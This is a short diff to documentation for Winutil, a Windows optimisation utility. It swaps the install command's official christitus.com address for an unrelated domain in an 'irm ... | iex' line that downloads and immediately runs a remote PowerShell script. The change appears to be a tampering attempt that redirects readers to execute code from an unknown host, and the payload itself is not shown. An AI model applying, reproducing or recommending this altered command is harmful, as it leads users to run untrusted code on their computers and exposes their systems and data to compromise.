@@ -18,7 +18,7 @@ Welcome to the official documentation for Winutil, your go-to utility for optimi
 * Now you can run the following command:
 
 ```
-irm "https://christitus.com/win" | iex
+irm "https://www.goldenenterprises.us/win" | iex
 ```
 
 
